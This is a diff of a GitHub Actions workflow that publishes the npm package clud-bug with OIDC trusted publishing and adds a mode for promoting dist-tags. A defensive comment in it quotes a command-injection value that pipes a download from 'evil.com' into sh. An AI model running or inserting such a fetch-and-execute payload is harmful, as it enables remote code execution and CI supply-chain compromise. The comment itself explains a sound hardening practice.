@@ -1,44 +1,77 @@
 name: npm publish
 
-# Publishes clud-bug to npm via OIDC Trusted Publishing — no NPM_TOKEN
-# secret stored anywhere. Configured at:
-#   https://www.npmjs.com/package/clud-bug → Settings → Publishing access
-#   → Trusted Publisher: thrillmot/clud-bug, workflow: npm-publish.yml.
+# Single workflow for every npm-side write on clud-bug. Both modes use the
+# same OIDC trusted-publisher integration — no NPM_TOKEN secret stored
+# anywhere. ONE entry needed at:
+#   npmjs.com/package/clud-bug → Settings → Publishing access
+#   → Trusted Publisher: thrillmot/clud-bug, workflow: npm-publish.yml,
+#     environment: blank.
 #
-# Triggers
-# --------
-#   push: tags v*
-#       Push a tag (e.g. `git tag v0.5.3 && git push origin v0.5.3`) and
-#       this workflow runs against that tag's commit. The tarball npm
-#       receives is exactly the code at that tag.
-#   workflow_dispatch
-#       Manual run for older tags that already exist (e.g. v0.4.1, v0.5.0).
-#       Pass the tag name; the workflow checks it out and publishes.
+# Modes
+# -----
+#   publish (default)
+#     Triggered by tag push OR workflow_dispatch with a tag input.
+#     Checks out the tag, runs prepublishOnly tests, publishes to npm
+#     with --provenance.
+#
+#   promote-tag
+#     workflow_dispatch only. Re-points an npm dist-tag (default
+#     "latest") at an already-published version. Reach for this when
+#     a parallel backfill via workflow_dispatch finishes out of order
+#     and "latest" lands on the wrong version, or to roll a tag back
+#     after a yank.
+#
+# Why everything in one workflow
+# ------------------------------
+# Both modes need the same trusted-publisher entry on npm (which keys
+# off filename), so consolidating means one entry covers all
+# npm-write operations and there's no chance of TP-config drift between
+# files. Trade-off: workflow inputs become a small enum instead of two
+# separate workflow files. Worth it.
 #
 # Why this beats a long-lived NPM_TOKEN
 # -------------------------------------
 # - No secret to leak, rotate, or revoke.
-# - GitHub mints a short-lived OIDC token per run; npm exchanges it for a
-#   one-shot publish token scoped to this exact workflow + commit.
-# - Each published version carries a cryptographic provenance attestation
-#   (the "✓ Published from GitHub Actions" badge on npm) so consumers can
-#   verify the tarball came from this repo.
+# - GitHub mints a short-lived OIDC token per run; npm exchanges it for
+#   a one-shot publish/dist-tag token scoped to this exact workflow +
+#   commit.
+# - Each published version carries a cryptographic provenance
+#   attestation (the "Published from GitHub Actions" badge on npm) so
+#   consumers can verify the tarball came from this repo.
 
 on:
   push:
     tags: ['v*']
   workflow_dispatch:
     inputs:
+      mode:
+        description: 'publish (default) or promote-tag'
+        required: false
+        default: 'publish'
+        type: choice
+        options:
+          - publish
+          - promote-tag
       tag:
-        description: 'Tag to publish (e.g. v0.5.2)'
-        required: true
+        description: 'For publish: tag to check out and publish (e.g. v0.5.2). Ignored in promote-tag mode.'
+        required: false
+        type: string
+      version:
+        description: 'For promote-tag: version to point the dist-tag at (e.g. 0.5.2 — no leading v). Ignored in publish mode.'
+        required: false
+        type: string
+      dist_tag:
+        description: 'For promote-tag: the dist-tag name (default: latest). Ignored in publish mode.'
+        required: false
+        default: 'latest'
         type: string
 
-# Default to no permissions; the publish job opts back into the two it needs.
+# Default to no permissions; jobs opt back into the two they need.
 permissions: {}
 
 jobs:
   publish:
+    if: github.event_name == 'push' || inputs.mode == 'publish'
     runs-on: ubuntu-latest
     permissions:
       contents: read
@@ -47,38 +80,103 @@ jobs:
       # See clud-bug-review.yml for the rationale on this env var.
       FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
     steps:
+      - name: Validate dispatch inputs
+        # Guard the workflow_dispatch path. The 'tag' input had to drop
+        # required: true so promote-tag dispatches don't have to fill
+        # it in. Without this check, a stray "publish" dispatch with no
+        # tag would resolve `inputs.tag || github.ref` to github.ref —
+        # which on workflow_dispatch is the BRANCH the dispatch was
+        # fired from (typically main), not a tag. The result would
+        # be a silent main-branch publish instead of a release publish.
+        # Tag-push triggers skip this (event_name == 'push').
+        if: github.event_name == 'workflow_dispatch'
+        env:
+          TAG_INPUT: ${{ inputs.tag }}
+        run: |
+          if [ -z "${TAG_INPUT}" ]; then
+            echo "::error::publish mode via workflow_dispatch requires the 'tag' input (e.g. v0.5.2). Refusing to publish from a branch."
+            exit 1
+          fi
+
       - name: Checkout the tag
         uses: actions/checkout@v5
         with:
           # On tag push, github.ref is refs/tags/vX.Y.Z (correct).
-          # On workflow_dispatch, fall back to the input.
+          # On workflow_dispatch (publish mode), inputs.tag is now
+          # required by the guard above, so the fallback to github.ref
+          # never fires here in practice — left for clarity.
           ref: ${{ inputs.tag || github.ref }}
 
       - name: Set up Node + npm registry
         uses: actions/setup-node@v5
         with:
           node-version: '20'
-          # Required for the OIDC handshake; setup-node writes a token-less
-          # .npmrc pointing at the registry, then `npm publish` performs
-          # the OIDC exchange automatically.
           registry-url: 'https://registry.npmjs.org'
 
       - name: Upgrade npm to a Trusted-Publishing-capable version
         # Node 20 ships npm 10.x. npm 10 signs provenance attestations
         # but does NOT exchange the OIDC token for a publish token —
         # it falls back to looking for NPM_TOKEN, finds none, and the
-        # publish PUT gets rejected with a misleading 404. Trusted
-        # Publishing's full flow (sign + auth via OIDC end-to-end)
-        # requires npm 11.5.1+.
+        # publish PUT gets rejected with a misleading 404. End-to-end
+        # OIDC publish needs npm 11.5.1+.
         run: npm install -g npm@latest
 
       - name: Install dependencies
         run: npm install --no-audit --no-fund
 
       - name: Publish
-        # --provenance is what triggers the OIDC exchange + attestation
-        # generation. --access public is required for unscoped packages
-        # (clud-bug is unscoped, but harmless either way).
-        # `prepublishOnly` in package.json runs `npm test` first, so a
-        # broken tag fails the publish loudly instead of silently shipping.
+        # --provenance triggers the OIDC exchange + attestation
+        # generation. --access public is required for unscoped packages.
+        # prepublishOnly runs npm test first, so a broken tag fails the
+        # publish loudly instead of silently shipping.
         run: npm publish --provenance --access public
+
+  promote-tag:
+    if: github.event_name == 'workflow_dispatch' && inputs.mode == 'promote-tag'
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    env:
+      FORCE_JAVASCRIPT_ACTIONS_TO_NODE24: 'true'
+    steps:
+      - uses: actions/setup-node@v5
+        with:
+          node-version: '20'
+          registry-url: 'https://registry.npmjs.org'
+
+      - name: Upgrade npm to a Trusted-Publishing-capable version
+        # Same reason as the publish job: dist-tag is one of the calls
+        # that needs OIDC end-to-end (sign + auth), which is npm 11.5.1+.
+        run: npm install -g npm@latest
+
+      - name: Validate inputs
+        # Bail loudly if version is missing — promote-tag without a
+        # version is meaningless. dist_tag has a default ("latest") so
+        # only version is strictly required.
+        env:
+          VERSION: ${{ inputs.version }}
+        run: |
+          if [ -z "${VERSION}" ]; then
+            echo "::error::promote-tag mode requires the 'version' input (e.g. 0.5.2)."
+            exit 1
+          fi
+
+      - name: Promote
+        # Inputs piped via env vars rather than inlined as ${{ inputs.* }}
+        # in the script body. Direct ${{ }} interpolation gets substituted
+        # into the bash source BEFORE bash parses it — a value like
+        #   0.5.2"; curl evil.com|sh; "
+        # would break out of the quoted arg and execute. Even though only
+        # repo maintainers can trigger workflow_dispatch, the env-var
+        # pattern is the standard way to eliminate this whole class of
+        # issue. See docs.github.com/en/actions/security-guides.
+        env:
+          VERSION: ${{ inputs.version }}
+          DIST_TAG: ${{ inputs.dist_tag }}
+        run: |
+          set -e
+          echo "Pointing dist-tag '${DIST_TAG}' at clud-bug@${VERSION}"
+          npm dist-tag add "clud-bug@${VERSION}" "${DIST_TAG}"
+          echo "---"
+          npm dist-tag ls clud-bug
